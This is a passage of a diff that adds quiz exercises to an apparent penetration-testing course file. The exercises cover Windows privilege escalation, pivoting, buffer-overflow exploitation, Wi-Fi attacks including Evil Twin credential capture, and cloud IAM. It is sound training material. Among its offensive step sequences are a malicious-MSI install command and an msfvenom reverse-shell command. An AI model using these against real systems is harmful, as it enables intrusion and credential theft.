+              "Drop a malicious Program.exe in that writable directory",
+              "Restart the service (reboot or SERVICE_START) to trigger execution"
+            ],
+            "explanation": "The SCM tries each earlier space-delimited segment as an executable first, so a writable earlier segment plus a service restart yields SYSTEM."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Name the Sysinternals tool that shows who can reconfigure a service (not just run it).",
+            "template": "___ reveals who has permission to reconfigure a service",
+            "blanks": [
+              "accesschk.exe"
+            ],
+            "explanation": "accesschk.exe (Sysinternals) surfaces service reconfiguration rights; icacls covers file ACLs and sc only shows current config.",
+            "distractors": [
+              "icacls",
+              "sc.exe"
+            ]
+          }
+        ],
         moduleId: "m17",
         number: 177,
         title:
@@ -30181,6 +36847,32 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m17-3",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to exploit AlwaysInstallElevated.",
+            "items": [
+              "Confirm AlwaysInstallElevated=1 under BOTH the HKLM and HKCU Installer keys",
+              "Generate a malicious MSI with msfvenom -f msi",
+              "Install it silently with msiexec /quiet /qn /i",
+              "Receive command execution as SYSTEM"
+            ],
+            "explanation": "Both registry values must be 1; then any user can have msiexec run an arbitrary MSI as SYSTEM, no exploit code required."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the msiexec flag that installs the package.",
+            "template": "msiexec /quiet /qn ___ evil.msi",
+            "blanks": [
+              "/i"
+            ],
+            "explanation": "/i installs the package; /quiet /qn suppress the UI, which is what makes this practical as a privesc technique.",
+            "distractors": [
+              "/x",
+              "/f"
+            ]
+          }
+        ],
         moduleId: "m17",
         number: 178,
         title: "Registry Misconfigurations - AlwaysInstallElevated",
@@ -30343,6 +37035,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m17-4",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each Potato-family tool (or privilege) to its distinguishing mechanism.",
+            "pairs": [
+              {
+                "left": "SeImpersonatePrivilege",
+                "right": "The privilege all three abuse to get a SYSTEM token"
+              },
+              {
+                "left": "JuicyPotato",
+                "right": "Needs a CLSID matching the target OS build"
+              },
+              {
+                "left": "RoguePotato",
+                "right": "Coerces DCOM auth to an attacker redirector"
+              },
+              {
+                "left": "PrintSpoofer",
+                "right": "Abuses the Print Spooler named-pipe impersonation"
+              }
+            ],
+            "explanation": "All abuse SeImpersonatePrivilege; JuicyPotato needs a version-correct CLSID, RoguePotato works around the port-135 fix, PrintSpoofer needs no CLSID when the Spooler runs."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the account the Potato tools ultimately spawn a command as.",
+            "template": "All three spawn a command running as NT AUTHORITY\\___",
+            "blanks": [
+              "SYSTEM"
+            ],
+            "explanation": "Each tool turns SeImpersonatePrivilege on a low-privilege service account into a full NT AUTHORITY\\SYSTEM token.",
+            "distractors": [
+              "Administrator",
+              "LOCAL SERVICE"
+            ]
+          }
+        ],
         moduleId: "m17",
         number: 179,
         title: "Token Impersonation - PrintSpoofer, RoguePotato, JuicyPotato",
@@ -30512,6 +37242,42 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m17-5",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps to discover and exploit a DLL hijack.",
+            "items": [
+              "Run Process Monitor filtered on NAME NOT FOUND and path ending .dll",
+              "Identify a DLL the target searches for but fails to find",
+              "Craft a payload DLL exporting the same function names as the legitimate DLL",
+              "Place the payload DLL in a directory searched before the legitimate one"
+            ],
+            "explanation": "Windows resolves a by-name DLL via its search order; a payload in an earlier-searched directory that exports the right functions loads instead of crashing."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each scheduled-task / hijack command to its purpose.",
+            "pairs": [
+              {
+                "left": "schtasks /query /fo LIST /v",
+                "right": "Show run-as account, trigger, and Task To Run path"
+              },
+              {
+                "left": "schtasks /run /tn <task>",
+                "right": "Force an immediate run instead of waiting for the trigger"
+              },
+              {
+                "left": "icacls <target>",
+                "right": "Check whether the current user can write the target binary"
+              },
+              {
+                "left": "Process Monitor",
+                "right": "Discover which DLLs a process fails to find"
+              }
+            ],
+            "explanation": "A SYSTEM task with a writable target is exploited by overwriting that target, then forcing a run with schtasks /run."
+          }
+        ],
         moduleId: "m17",
         number: 180,
         title: "Scheduled Task Privesc & DLL Hijacking",
@@ -30692,6 +37458,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m17-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each OpenSSH flag to what it does when tunneling through a jump box.",
+            "pairs": [
+              {
+                "left": "ssh -L",
+                "right": "Local forwarding: reach one destination via a local port"
+              },
+              {
+                "left": "ssh -R",
+                "right": "Remote forwarding: expose your service to the jump box's network"
+              },
+              {
+                "left": "ssh -D",
+                "right": "Dynamic forwarding: turn your machine into a SOCKS proxy"
+              },
+              {
+                "left": "ssh -N",
+                "right": "Open the tunnel with no remote shell"
+              }
+            ],
+            "explanation": "-L and -R forward single destinations in opposite directions; -D is the SOCKS proxy you pair with proxychains; -N skips the interactive session."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the flag that turns your machine into a SOCKS proxy over SSH.",
+            "template": "ssh ___ 1080 user@jumpbox",
+            "blanks": [
+              "-D"
+            ],
+            "explanation": "ssh -D opens a dynamic SOCKS proxy reaching anything the jump box can route to, which proxychains then uses.",
+            "distractors": [
+              "-L",
+              "-R"
+            ]
+          }
+        ],
         moduleId: "m17",
         number: 181,
         title: "SSH Tunneling for Pivoting (Local, Remote, Dynamic)",
@@ -30868,6 +37672,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m17-7",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each chisel / ligolo-ng component to where it runs or what it does.",
+            "pairs": [
+              {
+                "left": "chisel server --reverse",
+                "right": "Runs on the attacker box, accepts the reverse connection"
+              },
+              {
+                "left": "chisel client R:socks",
+                "right": "Runs on the pivot, opens a reverse SOCKS proxy"
+              },
+              {
+                "left": "ligolo-ng agent",
+                "right": "Runs on the pivot host"
+              },
+              {
+                "left": "ligolo-ng proxy",
+                "right": "Runs on the attacker with a tun interface"
+              }
+            ],
+            "explanation": "chisel tunnels SOCKS over HTTP (reverse direction when the pivot can only reach out); ligolo-ng uses a proxy/agent model plus a tun interface for transparent routing."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the chisel server flag that opens a reverse listener on the attacker box.",
+            "template": "chisel server -p 8000 ___",
+            "blanks": [
+              "--reverse"
+            ],
+            "explanation": "--reverse lets the pivot's client connect out with R:socks, which matters when the attacker cannot reach into the pivot.",
+            "distractors": [
+              "--socks",
+              "--client"
+            ]
+          }
+        ],
         moduleId: "m17",
         number: 182,
         title: "Modern Pivoting Tools - chisel & ligolo-ng",
@@ -31090,6 +37932,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m17-8",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each proxychains element to its meaning.",
+            "pairs": [
+              {
+                "left": "socks4 127.0.0.1 9050",
+                "right": "Classic Tor-pointing default ProxyList entry"
+              },
+              {
+                "left": "dynamic_chain",
+                "right": "Skip a dead proxy rather than failing outright"
+              },
+              {
+                "left": "nmap -sT",
+                "right": "TCP connect scan that works through the proxy"
+              },
+              {
+                "left": "-Pn",
+                "right": "Skip ICMP host discovery that won't route"
+              }
+            ],
+            "explanation": "proxychains wraps socket connect() calls; connect scans and -Pn work through it, while raw-packet features do not."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the nmap scan type that generally does NOT work through proxychains.",
+            "template": "SYN scans (___) do not route through a SOCKS proxy chain",
+            "blanks": [
+              "-sS"
+            ],
+            "explanation": "proxychains can only wrap standard socket connect() calls, so SYN scans (-sS) fail while connect scans (-sT) succeed.",
+            "distractors": [
+              "-sT",
+              "-Pn"
+            ]
+          }
+        ],
         moduleId: "m17",
         number: 183,
         title: "proxychains - Routing Tools Through a Pivot",
@@ -31272,6 +38152,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m17-9",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the end-to-end chain from beachhead foothold to scanning the internal segment.",
+            "items": [
+              "Enumerate the beachhead to find whichever privesc vector is present",
+              "Escalate to SYSTEM using that vector",
+              "Install a persistent tunnel client on the beachhead",
+              "Point proxychains at the tunnel's SOCKS proxy",
+              "Scan the internal segment through the pivot as proof"
+            ],
+            "explanation": "The realistic order is always enumerate -> privesc -> SYSTEM -> tunnel -> proxychains, with proof being access an attacker machine could never produce directly."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each beachhead recon command to what it reveals before you assume a segment is reachable.",
+            "pairs": [
+              {
+                "left": "ipconfig /all",
+                "right": "The beachhead's own IP addresses and DNS"
+              },
+              {
+                "left": "route print",
+                "right": "Which subnets the host can route to"
+              },
+              {
+                "left": "arp -a",
+                "right": "Neighboring hosts seen on the local segment"
+              },
+              {
+                "left": "proxychains nmap",
+                "right": "Prove the pivot reaches an internal host"
+              }
+            ],
+            "explanation": "The pivot only reaches hosts the beachhead itself can reach, so you enumerate its network config first and then prove reachability through the tunnel."
+          }
+        ],
         moduleId: "m17",
         number: 184,
         title:
@@ -31511,6 +38428,41 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m18-1",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "A buffer is overflowed upward. Order what gets overwritten, from first to last as the buffer grows.",
+            "items": [
+              "Adjacent local variables",
+              "Saved EBP (frame pointer)",
+              "Saved return address"
+            ],
+            "explanation": "The stack grows downward but the buffer fills upward, so growth reaches neighboring locals first, then the saved EBP, then the return address."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each stack-frame element to what it is or does.",
+            "pairs": [
+              {
+                "left": "Return address",
+                "right": "Where the CPU resumes after the function returns"
+              },
+              {
+                "left": "Saved EBP",
+                "right": "Caller's frame pointer preserved by the prologue"
+              },
+              {
+                "left": "char buffer[64]",
+                "right": "Fixed-size local overflowed with no bounds check"
+              },
+              {
+                "left": "Stack growth",
+                "right": "Downward in memory"
+              }
+            ],
+            "explanation": "Overwriting the return address lets the attacker choose where execution resumes, which is the core of stack-based overflow exploitation."
+          }
+        ],
         moduleId: "m18",
         number: 176,
         title:
@@ -31640,6 +38592,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m18-2",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps of fuzzing a network service to locate a crash.",
+            "items": [
+              "Attach a debugger to the target service",
+              "Send an increasing block of 'A' characters in a loop",
+              "Watch for the service to stop responding",
+              "Read EIP overwritten with 0x41414141 in the debugger",
+              "Note the approximate byte range that triggers the crash"
+            ],
+            "explanation": "Fuzzing only narrows the crash to a rough range; the debugger confirms the overflow reached the return address when EIP shows 0x41414141."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the fact that confirms the overflow reached the saved return address.",
+            "template": "A crash showing EIP == ___ confirms the 'A' bytes overwrote the saved return address.",
+            "blanks": [
+              "0x41414141"
+            ],
+            "explanation": "0x41414141 is four ASCII 'A' bytes, so seeing it in EIP proves the fuzzer's padding reached and overwrote the return address.",
+            "distractors": [
+              "0x42424242",
+              "0x386F4337"
+            ]
+          }
+        ],
         moduleId: "m18",
         number: 177,
         title: "Fuzzing to Find the Crash",
@@ -31818,6 +38797,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m18-3",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps that turn a fuzzed crash range into an exact offset.",
+            "items": [
+              "Generate a non-repeating cyclic pattern with pattern_create.rb",
+              "Send the pattern in place of the repeated 'A's",
+              "Crash the target and read EIP's 4 bytes",
+              "Run pattern_offset.rb on that EIP value",
+              "Receive the exact offset to the return address"
+            ],
+            "explanation": "Because every 4-byte window of a De Bruijn pattern is unique, the bytes landing in EIP map back to one exact position, giving the precise offset."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each term to its role in finding the exact offset.",
+            "pairs": [
+              {
+                "left": "pattern_create.rb",
+                "right": "Generates a non-repeating pattern of a chosen length"
+              },
+              {
+                "left": "pattern_offset.rb",
+                "right": "Looks up EIP bytes and returns the exact offset"
+              },
+              {
+                "left": "De Bruijn sequence",
+                "right": "Every 4-byte window is unique"
+              },
+              {
+                "left": "0x386F4337",
+                "right": "Example EIP value lifted from the pattern"
+              }
+            ],
+            "explanation": "pattern_create builds the unique sequence and pattern_offset reverses the EIP value back into the byte count of padding before the return address."
+          }
+        ],
         moduleId: "m18",
         number: 178,
         title: "Finding the Exact Offset (Cyclic / De Bruijn Pattern)",
@@ -31966,6 +38982,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m18-4",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the proof that your offset gives real EIP control.",
+            "template": "After sending padding + 'BBBB' + filler, EIP reading exactly ___ proves the offset is correct.",
+            "blanks": [
+              "0x42424242"
+            ],
+            "explanation": "'BBBB' is 0x42424242, so EIP holding exactly that value proves the 4 chosen bytes land in the return address.",
+            "distractors": [
+              "0x41414141",
+              "0x43434343"
+            ]
+          },
+          {
+            "type": "match",
+            "prompt": "Match each element of the EIP-control test to its meaning.",
+            "pairs": [
+              {
+                "left": "0x42424242 in EIP",
+                "right": "Proves the offset from the previous step was correct"
+              },
+              {
+                "left": "Block of 'C's after EIP",
+                "right": "Confirms the remaining buffer survives intact"
+              },
+              {
+                "left": "ESP at the crash",
+                "right": "Points into surviving space where shellcode goes"
+              },
+              {
+                "left": "Offset padding",
+                "right": "Bytes placed before the 4-byte EIP overwrite"
+              }
+            ],
+            "explanation": "This step turns 'we found an offset' into 'we control execution flow' and shows where surviving buffer space for shellcode lives."
+          }
+        ],
         moduleId: "m18",
         number: 179,
         title: "Controlling EIP",
@@ -32085,6 +39139,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m18-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each byte or result to its status in bad-character analysis.",
+            "pairs": [
+              {
+                "left": "0x00",
+                "right": "Almost always bad; terminates C strings"
+              },
+              {
+                "left": "0x0a",
+                "right": "Line feed, commonly bad in text protocols"
+              },
+              {
+                "left": "0x0d",
+                "right": "Carriage return, commonly bad in text protocols"
+              },
+              {
+                "left": "Byte unchanged in memory",
+                "right": "Safe to use in the buffer"
+              }
+            ],
+            "explanation": "Bytes that arrive altered or missing are filtered by the application and would corrupt the payload, so they must be excluded."
+          },
+          {
+            "type": "order",
+            "prompt": "Order the bad-character analysis workflow.",
+            "items": [
+              "Send the full 0x00-0xFF range right after the EIP marker",
+              "Compare the sent bytes against the target's memory",
+              "Flag any missing or altered byte as a bad character",
+              "Remove confirmed-bad bytes and repeat the test",
+              "Feed the final exclusion list into shellcode generation"
+            ],
+            "explanation": "A single bad byte can corrupt everything after it, so the test is repeated until a clean exclusion list (e.g. \\x00\\x0a\\x0d) remains for msfvenom."
+          }
+        ],
         moduleId: "m18",
         number: 180,
         title: "Bad Character Analysis",
@@ -32218,6 +39309,48 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m18-6",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each item to its role in the JMP ESP technique and modern mitigations.",
+            "pairs": [
+              {
+                "left": "JMP ESP",
+                "right": "Jumps to whatever address ESP currently holds"
+              },
+              {
+                "left": "mona.py",
+                "right": "Automates finding a bad-char-free candidate address"
+              },
+              {
+                "left": "ASLR",
+                "right": "Randomizes module base addresses per run"
+              },
+              {
+                "left": "DEP",
+                "right": "Marks stack memory non-executable"
+              },
+              {
+                "left": "ROP",
+                "right": "Modern technique used to bypass DEP"
+              }
+            ],
+            "explanation": "JMP ESP pivots reliably into the buffer, but ASLR breaks a hardcoded address and DEP blocks stack execution, which is why this classic technique targets unprotected training binaries."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the requirement for a reliable hardcoded JMP ESP address.",
+            "template": "A reliable JMP ESP must sit in a module with no ___ so its base address is the same every run.",
+            "blanks": [
+              "ASLR"
+            ],
+            "explanation": "ASLR randomizes module base addresses each run, so a hardcoded JMP ESP address only stays valid in a module that is not randomized.",
+            "distractors": [
+              "DEP",
+              "NOP sled"
+            ]
+          }
+        ],
         moduleId: "m18",
         number: 181,
         title: "Finding a JMP ESP (and Why ASLR/DEP Change Everything)",
@@ -32347,6 +39480,33 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m18-7",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the components of the final exploit buffer, start to end.",
+            "items": [
+              "Padding to the offset",
+              "JMP ESP address (little-endian)",
+              "NOP sled",
+              "Shellcode"
+            ],
+            "explanation": "EIP jumps to the JMP ESP address, which lands in the NOP sled, which slides execution into the shellcode even if the jump is slightly imprecise."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the msfvenom flags that exclude bad characters and set C output.",
+            "template": "msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -b '___' -f ___",
+            "blanks": [
+              "\\x00\\x0a\\x0d",
+              "c"
+            ],
+            "explanation": "-b passes the confirmed bad-character list so the shellcode avoids those bytes, and -f c emits C-formatted output for the exploit script.",
+            "distractors": [
+              "\\x90",
+              "exe"
+            ]
+          }
+        ],
         moduleId: "m18",
         number: 182,
         title: "Generating & Placing Shellcode (msfvenom, NOP Sled)",
@@ -32481,6 +39641,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m18-8",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the full stack buffer-overflow exploit chain, end to end.",
+            "items": [
+              "Fuzz to find an approximate crash range",
+              "Use a cyclic pattern to find the exact offset",
+              "Confirm EIP control, then identify bad characters",
+              "Find a bad-char-free JMP ESP in a non-ASLR module",
+              "Generate shellcode with msfvenom and deliver the buffer"
+            ],
+            "explanation": "Each step's output feeds the next, so an early error such as a wrong offset invalidates everything downstream."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each mitigation or reference to how it relates to this methodology.",
+            "pairs": [
+              {
+                "left": "ASLR",
+                "right": "Breaks a hardcoded JMP ESP address"
+              },
+              {
+                "left": "DEP",
+                "right": "Blocks executing shellcode on the stack"
+              },
+              {
+                "left": "Stack canary",
+                "right": "Detects the overwrite before the return address is used"
+              },
+              {
+                "left": "corelan.be",
+                "right": "Canonical public reference for this methodology"
+              }
+            ],
+            "explanation": "Modern mitigations each defeat a specific step, which is why the unmodified technique is foundational training rather than a reliable attack on hardened software."
+          }
+        ],
         moduleId: "m18",
         number: 183,
         title: "The Full Exploit Chain, End to End",
@@ -32672,6 +39869,50 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m19-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each 802.11 recon term to what it means.",
+            "pairs": [
+              {
+                "left": "Managed mode",
+                "right": "NIC processes only frames addressed to it, after associating"
+              },
+              {
+                "left": "Monitor mode",
+                "right": "NIC captures all 802.11 frames on a channel, associated or not"
+              },
+              {
+                "left": "BSSID",
+                "right": "The AP radio's real MAC — the true unique identifier"
+              },
+              {
+                "left": "ESSID",
+                "right": "The network name, which multiple APs can share"
+              },
+              {
+                "left": "airmon-ng",
+                "right": "Switches an adapter between managed and monitor mode"
+              }
+            ],
+            "explanation": "Monitor mode removes the managed-mode filtering so tools like airodump-ng see every AP and client; BSSID identifies one radio while ESSID is the shareable name."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the fact about beacon frames.",
+            "template": "An AP broadcasts beacon frames about ___ times per second, carrying the ESSID and the ___ (its radio's real MAC).",
+            "blanks": [
+              "10",
+              "BSSID"
+            ],
+            "explanation": "Beacons are sent roughly ten times a second and advertise the ESSID, BSSID, channel, and supported security suites, letting an adapter in monitor mode map the area passively.",
+            "distractors": [
+              "100",
+              "IV",
+              "PMK"
+            ]
+          }
+        ],
         moduleId: "m19",
         number: 176,
         title:
@@ -32832,6 +40073,35 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m19-2",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the steps by which WEP's key is recovered offline.",
+            "items": [
+              "Passively capture frames, each carrying a 24-bit IV sent in the clear",
+              "IVs repeat quickly because the 2^24 IV space is small",
+              "IV reuse leaks information about the RC4 keystream",
+              "Enough collected IVs let the keystream be recovered statistically",
+              "The static WEP key is derived without brute force or a wordlist"
+            ],
+            "explanation": "WEP's flaw is structural: a short, reused IV over a static RC4 key leaks keystream, so enough captured traffic alone exposes the key."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the description of WEP encryption.",
+            "template": "WEP encrypts each frame with ___ keyed on a static shared key plus a ___-bit IV transmitted unencrypted.",
+            "blanks": [
+              "RC4",
+              "24"
+            ],
+            "explanation": "The static key combined with a mere 24-bit cleartext IV is the design weakness that WPA/WPA2's per-session handshake was created to fix.",
+            "distractors": [
+              "AES",
+              "PBKDF2",
+              "48"
+            ]
+          }
+        ],
         moduleId: "m19",
         number: 177,
         title: "WEP's Fundamental Weakness — Why It Was Replaced",
@@ -32934,6 +40204,46 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m19-3",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Put the WPA/WPA2 4-way handshake messages in order.",
+            "items": [
+              "Message 1: AP sends the ANonce to the client",
+              "Message 2: client sends its SNonce plus a MIC",
+              "Message 3: AP confirms and installs the keys",
+              "Message 4: client acknowledges"
+            ],
+            "explanation": "The nonces exchanged live let both sides derive the PTK from the shared PMK; capturing them yields a MIC to test guesses against, not the key itself."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each WPA2 key/value to its role.",
+            "pairs": [
+              {
+                "left": "PSK",
+                "right": "The passphrase the user types in"
+              },
+              {
+                "left": "PMK",
+                "right": "Derived from PSK via PBKDF2; never sent over the air"
+              },
+              {
+                "left": "PTK",
+                "right": "Per-session encryption key derived from PMK plus both nonces"
+              },
+              {
+                "left": "ANonce",
+                "right": "Random nonce the AP sends"
+              },
+              {
+                "left": "SNonce",
+                "right": "Random nonce the client sends"
+              }
+            ],
+            "explanation": "Because the PMK and PTK are never transmitted, the only path to the passphrase is guessing candidates offline, so passphrase entropy is the real protection."
+          }
+        ],
         moduleId: "m19",
         number: 178,
         title: "The WPA/WPA2 4-Way Handshake",
@@ -33062,6 +40372,34 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m19-4",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the aircrack-ng workflow for capturing a handshake.",
+            "items": [
+              "airmon-ng start wlan0 puts the adapter into monitor mode",
+              "airodump-ng surveys the whole band to identify the target",
+              "airodump-ng -c <channel> --bssid <BSSID> -w <file> locks the capture",
+              "aireplay-ng --deauth forces a connected client to reassociate",
+              "airodump-ng shows 'WPA handshake' once the exchange is captured"
+            ],
+            "explanation": "Locking to one channel and BSSID avoids noise, and a deauth regenerates the 4-way handshake — but only if at least one client is already connected."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the airodump-ng capture command.",
+            "template": "airodump-ng ___ 6 ___ 00:11:22:33:44:55 -w capture wlan0mon",
+            "blanks": [
+              "-c",
+              "--bssid"
+            ],
+            "explanation": "-c pins the channel and --bssid pins the target AP, so the capture file only collects that one network's frames.",
+            "distractors": [
+              "-a",
+              "-w"
+            ]
+          }
+        ],
         moduleId: "m19",
         number: 179,
         title: "Capturing a Handshake with the Aircrack-ng Suite",
@@ -33235,6 +40573,45 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m19-5",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each cracking tool or mode to its purpose.",
+            "pairs": [
+              {
+                "left": "aircrack-ng -w wordlist file.cap",
+                "right": "Tests each word by re-deriving the MIC from the .cap"
+              },
+              {
+                "left": "hcxpcapngtool",
+                "right": "Converts a .cap into hashcat's hash format"
+              },
+              {
+                "left": "hashcat mode 22000",
+                "right": "Current unified WPA/WPA2 handshake + PMKID mode"
+              },
+              {
+                "left": "hashcat mode 2500",
+                "right": "Older, superseded EAPOL 4-way handshake mode"
+              }
+            ],
+            "explanation": "WPA2 recovery is a dictionary problem: every candidate is re-derived PMK->PTK->MIC and compared, so success depends on the wordlist, not raw compute."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the offline cracking commands.",
+            "template": "aircrack-ng ___ rockyou.txt capture.cap runs a dictionary attack, while hashcat's current unified WPA mode is ___.",
+            "blanks": [
+              "-w",
+              "22000"
+            ],
+            "explanation": "-w points aircrack-ng at the wordlist; mode 22000 superseded 2500 by unifying EAPOL handshake and PMKID cracking into one format.",
+            "distractors": [
+              "-c",
+              "2500"
+            ]
+          }
+        ],
         moduleId: "m19",
         number: 180,
         title: "Cracking the Captured Handshake Offline",
@@ -33376,6 +40753,35 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m19-6",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the logic of a WPS PIN attack.",
+            "items": [
+              "The 8th PIN digit is only a checksum of the first 7",
+              "The AP validates the first 4 digits and acknowledges them separately",
+              "The last 3 digits (plus checksum) are then guessed",
+              "reaver or bully recover the full PIN by exploiting split validation",
+              "WPS hands back the AP's configured WPA2 passphrase"
+            ],
+            "explanation": "Split, two-half validation shrinks the keyspace to about 10^4 + 10^3 guesses, and a recovered PIN returns the passphrase with no handshake cracking needed."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the WPS PIN fact.",
+            "template": "The WPS PIN is ___ digits, but the last digit is only a ___, leaving 7 meaningful digits.",
+            "blanks": [
+              "8",
+              "checksum"
+            ],
+            "explanation": "With the 8th digit fixed as a checksum and halves validated separately, the real search space is far smaller than a true 10^7 brute force — unless WPS is disabled or rate-limited.",
+            "distractors": [
+              "7",
+              "nonce",
+              "10"
+            ]
+          }
+        ],
         moduleId: "m19",
         number: 181,
         title: "WPS Attacks — Reaver and Bully",
@@ -33522,6 +40928,43 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m19-7",
+        exercises: [
+          {
+            "type": "order",
+            "prompt": "Order the stages of an Evil Twin attack.",
+            "items": [
+              "Stand up a rogue AP cloning the legitimate network's ESSID",
+              "Deauthenticate clients off the real AP",
+              "Victim's device reconnects to the clone with the expected name",
+              "A captive portal presents a fake login or firmware-update page",
+              "Victim enters the passphrase, capturing the credentials"
+            ],
+            "explanation": "Clients reconnect by ESSID without verifying AP identity, so the attack captures credentials through deception — no handshake to crack and no WPS math."
+          },
+          {
+            "type": "match",
+            "prompt": "Match each Evil Twin element to its role.",
+            "pairs": [
+              {
+                "left": "Evil Twin",
+                "right": "Rogue AP broadcasting a legitimate network's ESSID"
+              },
+              {
+                "left": "Deauth attack",
+                "right": "Pushes victim clients off the real AP"
+              },
+              {
+                "left": "Captive portal",
+                "right": "Fake page that asks the victim for the passphrase"
+              },
+              {
+                "left": "airgeddon / wifiphisher",
+                "right": "Automate the rogue AP, deauth, and portal workflow"
+              }
+            ],
+            "explanation": "Because it directly deceives real people, the Evil Twin sits closer to social engineering than protocol attacks and needs scope that explicitly covers client-facing interaction."
+          }
+        ],
         moduleId: "m19",
         number: 182,
         title: "Evil Twin / Rogue AP Attacks (Concept)",
@@ -33683,6 +41126,41 @@ export const CURRICULUM: Module[] = [
     topics: [
       {
         id: "m20-1",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each cloud service model to the customer's main security responsibility under the shared-responsibility model.",
+            "pairs": [
+              {
+                "left": "IaaS (EC2, Azure VMs)",
+                "right": "Guest-OS patching and everything above the hypervisor"
+              },
+              {
+                "left": "PaaS (RDS, App Service)",
+                "right": "Mainly data, access control, and service configuration"
+              },
+              {
+                "left": "SaaS",
+                "right": "Chiefly account security, user access, and data handling"
+              }
+            ],
+            "explanation": "As you move from IaaS to SaaS the provider manages more of the stack, so the customer's responsibility shrinks toward just data and access control."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the AWS phrasing of the shared-responsibility split.",
+            "template": "AWS frames it as security ___ the cloud (provider) versus security ___ the cloud (customer).",
+            "blanks": [
+              "of",
+              "in"
+            ],
+            "explanation": "The provider secures the underlying infrastructure ('of the cloud'); the customer secures what they configure and store ('in the cloud').",
+            "distractors": [
+              "on",
+              "around"
+            ]
+          }
+        ],
         moduleId: "m20",
         number: 176,
         title: "Cloud Shared-Responsibility Model",
@@ -33844,6 +41322,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m20-2",
+        exercises: [
+          {
+            "type": "match",
+            "prompt": "Match each IAM building block to its definition.",
+            "pairs": [
+              {
+                "left": "User",
+                "right": "Long-term individual identity with permanent credentials"
+              },
+              {
+                "left": "Group",
+                "right": "Attach the same policies to many users at once"
+              },
+              {
+                "left": "Role",
+                "right": "Temporary identity backed by short-lived credentials"
+              },
+              {
+                "left": "Policy",
+                "right": "JSON document defining allowed/denied actions"
+              }
+            ],
+            "explanation": "Users and groups manage identities, roles provide assumable short-lived credentials, and policies are the JSON that states what is permitted."
+          },
+          {
+            "type": "fill-blank",
+            "prompt": "Fill in the first command run during any cloud assessment.",
+            "template": "aws sts ___ reveals which identity your current credentials belong to.",
+            "blanks": [
+              "get-caller-identity"
+            ],
+            "explanation": "get-caller-identity returns the user, role, or assumed-role session tied to the active credentials, confirming exactly who you are.",
+            "distractors": [
+              "get-session-token",
+              "list-users"
+            ]
+          }
+        ],
         moduleId: "m20",
         number: 177,
         title: "IAM Fundamentals - Users, Groups, Roles, Policies",
@@ -34028,6 +41544,44 @@ export const CURRICULUM: Module[] = [
       },
       {
         id: "m20-3",
+        exercises: [
+          {
+            "type": "fill-blank",
+            "prompt": "Complete the AWS CLI call that hits a public bucket with no credentials.",
+            "template": "aws s3 ls s3://company-backups ___ makes a fully anonymous, unauthenticated request.",
